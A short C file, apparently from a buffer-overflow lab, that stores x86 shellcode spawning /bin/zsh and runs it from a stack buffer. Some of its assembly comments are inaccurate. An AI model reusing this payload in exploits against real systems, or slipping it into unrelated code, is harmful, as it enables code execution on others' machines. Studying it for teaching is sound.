// This program launches a shell //
// It is appropriately named call_shellcode.c //

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


const char code[] = 
   "\x31\xc0"		// Line 1: xor1 	%eax. %eax	//
   "\x50" 		// Line 2: push1	%eax		//
   "\x68""/zsh"		// Line 3: push1	$0x68732f2f	//
   "\x68""/bin" 	// Line 4: push1 	$0x6e69622f 	//
   "\x89\xe3" 		// Line 5: mov1 	%esp, %ebx	//
   "\x50" 		// Line 6: push1 	%eax		//
   "\x53" 		// Line 7: push1	%ebx		//
   "\x89\xe1"		// Line 8: mov1		%esp, %ecx	//
   "\x99"		// Line 9: cdq				//
   "\xb0\x0b"		// Line 10: movb	$0x0b		//
   "\xcd\x80"		// Line 11: int		$0x80		//
;


int main(int argc, char **argv)
{
    char buf[sizeof(code)];
    strcpy(buf, code);
     ((void(*)())buf)();
}


